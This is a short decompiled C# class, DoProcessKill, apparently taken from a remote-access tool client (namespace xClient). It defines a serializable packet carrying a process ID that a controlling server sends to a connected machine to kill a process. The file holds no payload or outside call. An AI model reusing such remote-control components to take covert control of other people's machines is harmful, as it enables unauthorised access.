using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x0200009A RID: 154
	[Serializable]
	public class DoProcessKill : IPacket
	{
		// Token: 0x1700009E RID: 158
		// (get) Token: 0x060003F0 RID: 1008 RVA: 0x00003F82 File Offset: 0x00002182
		// (set) Token: 0x060003F1 RID: 1009 RVA: 0x00003F8A File Offset: 0x0000218A
		public int PID { get; set; }

		// Token: 0x060003F2 RID: 1010 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoProcessKill()
		{
		}

		// Token: 0x060003F3 RID: 1011 RVA: 0x00003F93 File Offset: 0x00002193
		public DoProcessKill(int pid)
		{
			this.PID = pid;
		}

		// Token: 0x060003F4 RID: 1012 RVA: 0x00003FA2 File Offset: 0x000021A2
		public void Execute(Client client)
		{
			client.Send<DoProcessKill>(this);
		}
	}
}
